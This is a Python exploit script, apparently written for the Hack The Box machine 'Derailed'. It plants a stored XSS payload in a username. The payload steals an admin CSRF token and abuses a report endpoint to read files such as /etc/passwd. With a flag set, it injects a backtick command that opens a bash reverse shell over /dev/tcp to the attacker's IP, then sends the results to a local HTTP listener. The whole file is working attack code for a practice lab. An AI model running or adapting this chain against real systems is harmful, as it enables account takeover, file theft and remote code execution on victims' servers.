import argparse
import base64
import queue
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from automate import *


class RequestHandler(BaseHTTPRequestHandler):
    queue_out = queue.Queue()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data_raw = self.rfile.read(content_length)
        post_data = post_data_raw.decode()
        logger.success(post_data)
        self.send_response(200)
        self.send_header('Connection', 'close')
        self.end_headers()
        self.queue_out.put(post_data)


payload = """fetch('http://derailed.htb:3000/administration')
.then(response => response.text())
.then(data => {{
    const re = new RegExp('name="authenticity_token".*value="([^\"]+)"');
    let auth_token = re.exec(data)[1];
    fetch('http://derailed.htb:3000/administration/reports', {{
      method: "POST", headers: {{
        "Content-Type": "application/x-www-form-urlencoded", 
        "Referer": "http://derailed.htb:3000/administration"
      }},
      body: 'authenticity_token=' + auth_token + '&report_log={file}&button='
    }})
    .then(r => r.text())
    .then(d => {{
      fetch('http://{ip}:{port}/', {{
        method: "POST", 
        body: d
      }})
    }})
}});
"""

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", type=str)
    parser.add_argument("--port", type=int, default=8888)
    parser.add_argument("--file", type=str)
    parser.add_argument("--reverse-shell-port", type=int, default=5555)
    parser.add_argument("--rce", action='store_true')
    args = parser.parse_args()

    if args.file is None:
        if args.rce:
            file = f"bash -c 'bash -i >& /dev/tcp/{args.ip}/{args.reverse_shell_port} 0>&1'"
        else:
            file = "/etc/passwd"
    else:
        file = args.file
    # url encode
    file = "".join(f"%{ord(x):02x}" for x in file)

    if args.rce:
        file = f"|`{file}`"

    server = (args.ip, args.port)
    httpd = HTTPServer(server, RequestHandler)
    httpd.allow_reuse_address = True
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.start()

    s = requests.Session()

    payload_encoded = base64.b64encode(
        payload.format(ip=args.ip, port=args.port, file=file).encode()
    ).decode()
    username = random_string(length=0x30) + f'<img src=x onerror=eval(atob(\"{payload_encoded}\")) />'
    password = random_string()
    register(s, username, password)
    login(s, username, password)
    note_id = create_note(s, random_string())
    report_note(s, note_id=note_id)
    logger.info("Waiting a few minutes for XSS to get triggered")
    RequestHandler.queue_out.get()
    httpd.shutdown()
